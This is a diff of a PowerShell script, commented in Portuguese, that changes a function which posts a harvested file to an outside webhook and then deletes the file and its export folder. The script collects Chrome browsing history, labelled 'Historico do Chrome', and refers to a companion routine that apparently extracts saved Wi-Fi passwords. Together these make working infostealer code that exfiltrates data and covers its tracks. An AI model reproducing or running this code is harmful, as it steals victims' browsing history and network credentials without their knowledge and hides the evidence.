@@ -141,7 +141,6 @@ ORDER BY last_visit_time DESC
     return $OutputFile
 }
 
-
 function send_file_to_webhook {
     [CmdletBinding()]
     param(
@@ -150,6 +149,8 @@ function send_file_to_webhook {
 
         [Parameter(Mandatory=$true)]
         [string]$WebhookUrl,                   # URL do webhook para onde enviar
+
+        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo
 
         [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
         [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
@@ -176,33 +177,19 @@ function send_file_to_webhook {
         }
     }
 
-    # Lê bytes
-    try {
-        $bytes = [System.IO.File]::ReadAllBytes($resolvedPath)
-    } catch {
-        throw "Falha ao ler o arquivo '$resolvedPath': $_"
-    }
-
     # Envia e apaga o arquivo após envio
     try {
+        # Lê o conteúdo do arquivo
+        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8
 
-        ##### adicionado #####
-        # Obtém o nome do arquivo e seu conteúdo
-        $fileName = [System.IO.Path]::GetFileName($resolvedPath)
-        $fileContent = Get-Content -Path $resolvedPath -Raw
-
-        # Sintaxe corrigida usando chaves para evitar conflito de escopo/drive
-        $payloadText = "${fileName}: ${fileContent}"
+        # Monta a string no formato "Titulo: conteudo"
+        $payloadText = "${Titulo}: ${fileContent}"
 
         # Converte a string montada para bytes UTF-8
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)
 
         # Envia a requisição
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
-        ######################
-
-
-        #Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
 
         # Remove o arquivo após envio
         if (Test-Path -Path $resolvedPath) {
@@ -221,10 +208,9 @@ function send_file_to_webhook {
         } catch {
             Write-Verbose "Falha ao remover pasta de exportação: $_"
         }
-        
     }
 
-    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date) }
+    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
 }
 
 # === Execução principal (rodará automaticamente quando o script for executado) ===
@@ -241,7 +227,7 @@ if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
         Write-Host "Enviando para webhook: $WebhookUrl"
         
         # Garante que a chamada passe os parâmetros corretamente
-        $sendResult = send_file_to_webhook -FilePath $out -WebhookUrl $WebhookUrl -ExportDir $ExportDirDefault
+        $sendResult = send_file_to_webhook -FilePath $out -WebhookUrl $WebhookUrl -ExportDir $ExportDirDefault -Titulo "Historico do Chrome" -RemoveExportDir
         
         # Exibe o resultado checando se o retorno possui as propriedades
         if ($null -ne $sendResult) {
